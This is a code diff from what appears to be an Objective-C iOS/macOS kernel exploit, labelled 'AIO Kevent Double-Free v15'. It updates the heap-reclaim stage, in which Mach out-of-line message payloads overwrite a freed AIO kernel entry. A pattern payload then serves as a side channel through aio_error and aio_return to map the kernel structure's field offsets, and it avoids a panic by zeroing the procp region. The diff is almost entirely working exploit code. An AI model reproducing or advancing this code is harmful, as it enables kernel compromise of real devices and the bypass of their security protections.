@@ -5681,7 +5681,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v14 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v15 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5943,18 +5943,17 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     }
     [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
 
-    // OOL payload with signature so we can recognize it in ext values
-    enum { kDrainOolSize = 232 };
+    // OOL payload: each byte = its own offset (for field mapping via side-channel)
+    // When OOL overwrites E1's AIO entry, aio_error() and aio_return() read
+    // specific fields. By setting payload[off] = off, the returned values
+    // directly reveal which byte offsets map to each AIO field.
+    enum { kDrainOolSize = 256 };
     uint8_t *drainPayload = (uint8_t *)calloc(1, kDrainOolSize);
     if (drainPayload) {
-        // Fill with signature: ext[1] should show this if OOL overwrites AIO entry
-        uint64_t sigReturnval = 0xBEEF0002BEEF0002ULL;
-        uint32_t sigErrorval  = 0xCAFE0003;
-        // Leave most fields zero (safe for AIO entry fields not accessed by aio_error)
-        memcpy(drainPayload + 0x20, &sigReturnval, 8);  // returnval
-        memcpy(drainPayload + 0x28, &sigErrorval, 4);   // errorval
-        // procp at +0x40 left as 0 — SAFE because we never call kevent64!
-        // aio_error/aio_return check entry flags, not procp.
+        for (int i = 0; i < kDrainOolSize; i++) drainPayload[i] = (uint8_t)i;
+        // Zero out potential procp region to avoid kevent64 panic if used
+        // (offsets ~0x40-0x48 — set to 0 for safety)
+        memset(drainPayload + 0x40, 0, 16);
     }
 
     typedef struct {
@@ -6050,31 +6049,19 @@ static void *aio_free_and_reclaim_racer(void *arg) {
                 [self appendLog:@"  *** E1 EFAULT — OOL corrupted E1's buf/fd fields ***"];
                 [self appendLog:@"  *** Overlap confirmed — now reading slot contents ***"];
 
-                // ---- Phase E: Receive overlap msg to map kernel slot data ----
-                [self appendLog:@"\n--- Phase E: Dump OOL from overlapRecv ---"];
-                {
-                    DrainMsg eRcv;
-                    memset(&eRcv, 0, sizeof(eRcv));
-                    eRcv.header.msgh_size = sizeof(DrainMsg);
-                    kern_return_t ekr = mach_msg(&eRcv.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                                  0, sizeof(DrainMsg), overlapRecv, 500, MACH_PORT_NULL);
-                    [self appendLog:[NSString stringWithFormat:@"  E: recv kr=%d (0=ok, %d=TIMEOUT, %d=INVALID_NAME)",
-                                      ekr, MACH_RCV_TIMED_OUT, MACH_RCV_INVALID_NAME]];
-                    if (ekr == MACH_MSG_SUCCESS && eRcv.ool.address != NULL) {
-                        uint8_t *d = (uint8_t *)eRcv.ool.address;
-                        int sz = eRcv.ool.size;
-                        [self appendLog:[NSString stringWithFormat:@"  E: OOL addr=%p size=%d", eRcv.ool.address, sz]];
-                        int words = (sz < 256 ? sz : 256) / 8;
-                        for (int i = 0; i < words; i++) {
-                            uint64_t v = *(uint64_t *)(d + i * 8);
-                            // Highlight non-zero values (kernel-written fields)
-                            [self appendLog:[NSString stringWithFormat:@"  +0x%02x: 0x%016llx%s", i * 8, v,
-                                              (v != 0 && v != 0xAA00000000000000ULL) ? " ***" : ""]];
-                        }
-                    } else {
-                        [self appendLog:[NSString stringWithFormat:@"  E: recv failed or NULL addr (addr=%p)", eRcv.ool.address]];
-                    }
-                }
+                // ---- Phase E: Read slot via AIO side-channel ----
+                // Mach recv doesn't work (extract_right kills recv). Instead, map
+                // AIO entry layout by reading aio_error/returnval with pattern OOL.
+                // payload[i]=i, so returned bytes directly reveal field offsets.
+                [self appendLog:@"\n--- Phase E: AIO side-channel field map ---"];
+                int e1err = aio_error(&e1);
+                ssize_t e1ret = aio_return(&e1);
+                [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0x%08x)", e1err, e1err]];
+                [self appendLog:[NSString stringWithFormat:@"  E1 aio_return=%lld (0x%016llx)", (long long)e1ret, (unsigned long long)e1ret]];
+                // If aio_error returns EFAULT (14), errorval may be elsewhere or
+                // aio_error does additional validation on corrupted flags.
+                // aio_return should read returnval directly — its value tells us
+                // which OOL bytes landed at the returnval offset.
             } else if (e1state == 0) {
                 [self appendLog:@"  E1 valid — OOL did not hit same slot (magazine drain insufficient)"];
                 aio_return(&e1);
@@ -6091,16 +6078,12 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         }
     }
 
-    // Drain all remaining messages from ports (best-effort, ignore errors)
+    // Destroy all drain ports (no recv possible — extract_right killed recv rights)
     for (int p = 0; p < drainPortsReady; p++) {
-        DrainMsg drmsg;
-        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), drainRecv[p], 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
         mach_port_destroy(mach_task_self_, drainRecv[p]);
         mach_port_deallocate(mach_task_self_, drainSend[p]);
     }
     if (overlapRecv != MACH_PORT_NULL) {
-        DrainMsg drmsg;
-        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), overlapRecv, 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
         mach_port_destroy(mach_task_self_, overlapRecv);
         mach_port_deallocate(mach_task_self_, overlapSend);
     }
